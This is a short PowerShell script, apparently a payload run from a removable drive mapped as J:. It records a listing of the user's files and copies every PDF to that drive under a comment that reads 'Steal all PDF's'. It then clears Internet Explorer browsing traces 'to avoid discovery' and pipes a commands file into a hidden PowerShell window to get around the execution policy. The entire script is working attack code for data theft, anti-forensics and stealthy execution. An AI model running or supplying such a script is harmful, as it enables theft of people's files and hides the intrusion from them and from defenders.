$Domain=$env:UserDomain
$Storage="J:\$Domain\Uploads"
cd J:
mkdir $Domain
cd $Domain
mkdir Uploads

#List and record all files
Get-ChildItem -Recurse C:\Users\$User > $Storage\Current_File_List.txt
# Steal all PDF's
Get-Childitem C:\Users\$User -recurse -filter "*.pdf" | %{Copy-Item -Path $_.FullName -Destination $Storage}
#Purge IE settings again to avoid discovery
rundll32.exe InetCpl.cpl, ClearMyTracksByProcess 8
rundll32.exe InetCpl.cpl, ClearMyTracksByProcess 2
rundll32.exe InetCpl.cpl, ClearMyTracksByProcess 16
rundll32.exe InetCpl.cpl, ClearMyTracksByProcess 32
#Bypass Restricted Execution Policy and launch Today's commands
cat J:\todays-commands.txt | powershell.exe -windowstyle hidden
